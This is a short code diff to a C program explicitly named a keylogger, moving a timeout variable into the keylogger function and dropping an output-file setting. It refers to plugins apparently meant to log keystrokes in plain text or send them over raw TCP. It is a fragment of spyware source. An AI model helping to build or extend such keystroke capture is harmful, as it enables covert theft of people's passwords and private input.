@@ -11,11 +11,8 @@
 #define SLEEP 50000
 #define INTERVALOFINACTIVITY 5
 
-time_t timeout = 0;
-
 int background = 0;
-char *outputfile = "key.log";
-const char *plugins[] = {"mikey-rawtcp.so","mikey-plaintext.so"};
+const char *plugins[] = {"mikey-rawtcp.so", "mikey-plaintext.so"};
 
 void handleArgs(void **hdlarr, int argc, char* argv[]) {
 
@@ -96,6 +93,8 @@ void keylogger(void **hdlarr) {
     int  iCheck;
 
     char keyboardStatesym, *keyboardStateString;
+ 
+    time_t timeout = 0;
 
     int keyCode;
     int needToFree = 0;
